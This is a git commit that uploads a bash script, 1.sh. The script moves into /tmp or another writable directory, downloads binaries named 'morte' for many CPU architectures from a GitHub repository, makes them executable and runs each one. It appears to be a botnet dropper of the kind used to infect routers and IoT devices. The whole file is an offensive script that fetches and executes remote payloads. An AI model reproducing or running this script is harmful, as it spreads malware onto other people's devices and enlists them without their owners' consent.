3b10387ffd4cf1d725625778858d2054f0b02784
fniesonoiawp <hahaaoligei@hotmail.com>
2026-01-11 21:24:02 +0800

    Add files via upload

---
+++ 1.sh
@@ -0,0 +1,16 @@
+#!/usr/bin/env bash
+ulimit -n 1024
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.x86; chmod 755 *; ./morte.x86 morte.x86;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.mips; chmod 755 *; ./morte.mips morte.mips;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.arc; chmod 755 *; ./morte.arc morte.arc;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.i468; chmod 755 *; ./morte.i468 morte.i468;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.i686; chmod 755 *; ./morte.i686 morte.i686;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.x86_64; chmod 755 *; ./morte.x86_64 morte.x86_64;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.mpsl; chmod 755 *; ./morte.mpsl morte.mpsl;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.arm; chmod 755 *; ./morte.arm morte.arm;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.arm5; chmod 755 *; ./morte.arm5 morte.arm5;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.arm6; chmod 755 *; ./morte.arm6 morte.arm6;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.arm7; chmod 755 *; ./morte.arm7 morte.arm7;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.ppc; chmod 755 *; ./morte.ppc morte.ppc;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.m68k; chmod 755 *; ./morte.m68k morte.m68k;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.sh4; chmod 755 *; ./morte.sh4 morte.sh4;
